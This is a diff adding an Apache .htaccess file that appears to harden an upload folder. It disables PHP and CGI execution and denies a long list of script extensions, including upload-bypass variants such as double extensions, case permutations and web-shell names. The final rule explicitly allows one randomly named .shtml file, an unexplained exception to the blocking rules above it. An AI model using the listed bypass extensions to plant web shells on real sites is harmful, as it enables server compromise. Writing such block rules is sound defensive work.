@@ -1,0 +1,35 @@
+<IfModule mod_php4.c>
+  php_flag engine Off
+</IfModule>
+<IfModule mod_php5.c>
+  php_flag engine Off
+</IfModule>
+<IfModule mod_php6.c>
+  php_flag engine Off
+</IfModule>
+<IfModule mod_cgi.c>
+  Options -ExecCGI
+</IfModule>
+
+RemoveHandler .cgi .pl .py .pyc .pyo .phtml .php .php3 .php4 .php5 .php6 .pcgi .pcgi3 .pcgi4 .pcgi5 .pchi6 .inc
+RemoveType .cgi .pl .py .pyc .pyo .phtml .php .php3 .php4 .php5 .php6 .pcgi .pcgi3 .pcgi4 .pcgi5 .pchi6 .inc
+SetHandler None
+SetHandler default-handler
+
+# Remove both lines below if you want to render HTML files from the upload folder
+AddType text/plain .html
+AddType text/plain .htm
+
+Options -Indexes
+<FilesMatch ".*\.(cgi|pl|py|pyc|pyo|php3|php4|php5|php6|pcgi|pcgi3|pcgi4|pcgi5|pchi6|inc|php|Php|pHp|phP|PHp|pHP|PhP|PHP|PhP|php5|Php5|phar|PHAR|Phar|PHar|PHAr|pHAR|phAR|inc|phaR|pHp5|phP5|PHp5|pHP5|PhP5|PHP5|cgi|CGI|CGi|cGI|PhP5|php6|php7|php8|php9|phtml|Phtml|pHtml|phTml|pHTml|Fla|fLa|flA|FLa|fLA|FlA|FLA|phtMl|phtmL|PHtml|PhTml|PHTML|PHTml|PHTMl|PhtMl|PHTml|PHtML|pHTMl|PhTML|pHTML|PhtmL|PHTmL|PhtMl|PhtmL|pHtMl|PhTmL|pHtmL|aspx|ASPX|asp|ASP|php.jpg|PHP.JPG|php.xxxjpg|PHP.XXXJPG|php.jpeg|PHP.JPG|PHP.JPEG|PHP.PJEPG|php.pjpeg|php.fla|PHP.FLA|php.png|PHP.PNG|php.gif|PHP.GIF|php.test|php;.jpg|PHP JPG|PHP;.JPG|php;.jpeg|php jpg|php.bak|php.pdf|php.xxxpdf|php.xxxpng|fla|Fla|fLa|fLa|flA|FLa|fLA|FLA|FlA|php.xxxgif|php.xxxpjpeg|php.xxxjpeg|php3.xxxjpeg|php3.xxxjpg|php5.xxxjpg|php3.pjpeg|php5.pjpeg|shtml|php.unknown|php.doc|php.docx|php.pdf|php.ppdf|jpg.PhP|php.txt|php.xxxtxt|PHP.TXT|PHP.XXXTXT|php.xlsx|php.zip|php.xxxzip|php78|php56|php96|php69|php67|php68|php4|shtMl|shtmL|SHtml|ShTml|SHTML|SHTml|SHTMl|ShtMl|SHTml|SHtML|sHTMl|ShTML|sHTML|ShtmL|SHTmL|ShtMl|ShtmL|sHtMl|ShTmL|sHtmL|Shtml|sHtml|shTml|sHTml|shtml|php1|php2|php3|php4|php10|alfa|suspected|py|exe|alfa)$"> 
+Order Allow,Deny
+Deny from all
+</FilesMatch>
+<FilesMatch "(?i).*(ph|sh|pj|env|cg).*">
+Order Deny,Allow
+Deny from all
+</FilesMatch>
+<FilesMatch '^(asfasfds.shtml)$'>
+Order allow,deny
+Allow from all
+</FilesMatch>
